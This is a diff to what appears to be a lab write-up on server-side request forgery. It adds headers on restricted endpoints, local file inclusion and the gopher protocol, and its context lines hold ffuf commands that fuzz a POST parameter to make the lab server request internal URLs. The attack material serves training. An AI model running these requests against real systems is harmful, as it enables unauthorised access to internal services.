@@ -21,6 +21,10 @@ ffuf -w ./ports.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: app
 ```
 
 ## Explotation
+### Accessing Restricted Endpoints
 ```bash
 ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" -fr "Server at dateserver.htb Port 80"
 ```
+### Local File Inclusion (LFI)
+<img width="1550" height="570" alt="image" src="https://github.com/user-attachments/assets/51c4db5c-b35e-476e-bd00-4ed4702d60d2" />
+### The gopher Protocol
